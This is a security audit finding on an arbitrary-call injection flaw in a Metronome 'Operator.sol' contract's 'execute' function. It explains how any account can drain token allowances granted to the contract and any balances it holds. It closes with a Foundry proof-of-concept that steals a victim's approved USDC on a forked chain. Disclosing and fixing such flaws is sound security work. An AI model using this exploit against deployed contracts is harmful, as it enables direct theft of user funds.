### Title
Arbitrary call injection via unauthenticated `Operator.execute` lets any EOA drain assets and allowances held by the `Operator` contract - (File: contracts/Operator.sol)

### Summary
CVE-2025-65882 is a command/arbitrary-write injection class bug: untrusted input is used to drive privileged operations without validation. The Metronome analog is `Operator.execute`, which performs arbitrary `functionCallWithValue` calls where `msg.sender` is the `Operator` contract itself. Any ERC20 allowance granted by users to `Operator`, and any ETH/ERC20 balance held by `Operator`, can be taken by an unprivileged attacker who simply submits `transferFrom`/`transfer`-style calls — the tokens see `msg.sender == Operator` and honor Operator's authority. This is a confused-deputy arbitrary-call injection with no allowlist on `target` or `callData`.

### Finding Description
`Operator.execute` iterates attacker-supplied `Call[]` and executes each `target.functionCallWithValue(callData, value)` directly from the `Operator` contract [1](#0-0) .

There is no restriction on `target` or `callData`. `setMsgSender` only stores the caller in a transient slot for `SynthContext` identity resolution — it does not limit which contracts may be invoked [2](#0-1) . `SynthContext._msgSender` translates `msg.sender == operator` back to the real sender for Metronome contracts [3](#0-2) , but external ERC20s have no such translation: to any ERC20, the call is from `Operator`.

Therefore an attacker can call `Operator.execute([{target: USDC, callData: transferFrom(victim, attacker, amount), value: 0}])`, and the call succeeds for any `victim` who has approved `Operator`. Similarly, `execute` can sweep the Operator contract's own ERC20/ETH balance (e.g. tokens a user mistakenly transferred to Operator, or leftovers pulled into Operator as an intermediate step of a multicall).

The identity invariant that breaks: `Operator` is meant to be a pure forwarding context, but it retains standing authority (allowances, balances) that `execute` exposes to arbitrary injected calldata — the exact analog of attacker-controlled input reaching a privileged execution sink.

### Impact Explanation
Any user who has ever given a token allowance to the `Operator` contract (a natural consequence of multicall UX where users approve the visible "operator" entry point) can have those approved tokens stolen by any EOA, with no privileged role required. Additionally, assets held at the Operator address (stuck tokens, ETH dust, transient balances) can be claimed by anyone. This is direct theft of user funds.

### Likelihood Explanation
Attack cost is a single `execute` call; no flash loan, governance action, or trusted-party compromise is needed. Exploitability depends on allowances existing to `Operator`; since `Operator` is the user-facing batch entry point for Metronome contracts (deposit + mint + leverage in one tx), users granting it allowances is a realistic and even encouraged pattern. `nonReentrant` does not help — the malicious call is a first-order call in the batch, not a reentrancy. `msg.value` is forced to equal the sum of call values, which does not constrain the calldata at all.

### Recommendation
Restrict `execute` to an allowlist of Metronome protocol targets (pools, deposit/debt tokens, gateways, dispatcher), or reject calls whose `target` is a token contract while `Operator` holds/controls spending authority. At minimum, document that users must never approve `Operator`, and prefer pulling tokens inside each protocol call rather than relying on Operator-level authority.

### Proof of Concept
Foundry sketch (fork any chain where `Operator` is deployed):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IOperator} from "../contracts/interfaces/IOperator.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract OperatorArbitraryCallTest is Test {
    IOperator operator = IOperator(OPERATOR_ADDR); // deployed Operator
    IERC20 usdc = IERC20(USDC_ADDR);

    function test_drainAllowanceToOperator() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        deal(address(usdc), victim, 1_000e6);

        // victim approves Operator (as users do for batched UX)
        vm.prank(victim);
        usdc.approve(address(operator), type(uint256).max);

        // attacker injects a transferFrom call executed from Operator's context
        IOperator.Call[] memory calls = new IOperator.Call[](1);
        calls[0] = IOperator.Call({
            target: address(usdc),
            value: 0,
            callData: abi.encodeCall(IERC20.transferFrom, (victim, attacker, 1_000e6))
        });

        vm.prank(attacker);
        operator.execute(calls);

        assertEq(usdc.balanceOf(attacker), 1_000e6); // stolen
        assertEq(usdc.balanceOf(victim), 0);
    }

    function test_sweepOperatorBalance() public {
        // any ERC20/ETH sitting at Operator can be pulled out by anyone
        deal(address(usdc), address(operator), 500e6);
        IOperator.Call[] memory calls = new IOperator.Call[](1);
        calls[0] = IOperator.Call({
            target: address(usdc),
            value: 0,
            callData: abi.encodeCall(IERC20.transfer, (msg.sender, 500e6))
        });
        operator.execute(calls);
    }
}
```

The calls pass all checks: `setMsgSender` records the attacker (which is only consulted by `SynthContext` contracts, not by `usdc`), `nonReentrant` is satisfied, and `msg.value == _sumOfValues` holds with zero values.
